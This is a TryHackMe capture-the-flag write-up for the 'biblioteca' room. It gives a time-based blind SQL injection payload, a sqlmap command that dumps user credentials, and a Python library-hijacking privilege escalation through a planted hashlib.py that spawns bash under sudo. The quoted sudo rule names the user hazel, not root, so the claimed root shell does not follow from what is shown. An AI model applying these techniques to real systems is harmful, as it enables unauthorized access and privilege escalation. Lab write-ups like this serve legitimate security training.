---
title: "TryHackMe: biblioteca — Writeup"
date: 2022-05-21 10:00:00 +0800
categories: [TryHackMe]
tags: [linux, ctf, sqli, priv-esc, python]
---

## Overview

**biblioteca** is a medium TryHackMe room with SQL injection for initial access, then Python library hijacking for privilege escalation. Good practice for blind SQLi and understanding Python import order.

---

## Recon

```bash
nmap -sC -sV 10.10.x.x
```

Ports 22 (SSH) and 8080 (HTTP). Web app has a login form.

---

## SQLi — Authentication Bypass

Tested login form with `'` — generic error returned. Tried time-based blind:

```
username: admin' AND SLEEP(5)-- -
```

5-second delay confirmed blind SQLi. Used `sqlmap`:

```bash
sqlmap -u "http://10.10.x.x:8080/login" \
  --data="username=admin&password=pass" \
  --level=3 --risk=2 --dump
```

Dumped the `users` table — retrieved credentials. SSH'd in as `hazel`.

---

## Privilege Escalation — Python Library Hijacking

```bash
sudo -l
```

```
(hazel) NOPASSWD: /usr/bin/python3 /home/hazel/hasher.py
```

`hasher.py` imports `hashlib`. Checked Python's path order:

```bash
python3 -c "import sys; print(sys.path)"
```

First entry: current working directory. Created a fake `hashlib.py` in `hazel`'s home:

```python
# /home/hazel/hashlib.py
import os
os.system("bash")
```

```bash
sudo /usr/bin/python3 /home/hazel/hasher.py
```

Shell as root. Flag at `/root/root.txt`.

---

## Key Takeaway

Python import hijacking is subtle — if a script can be run with elevated privileges and imports non-absolute modules, dropping a fake module file in a writable directory on the path is a clean privesc.
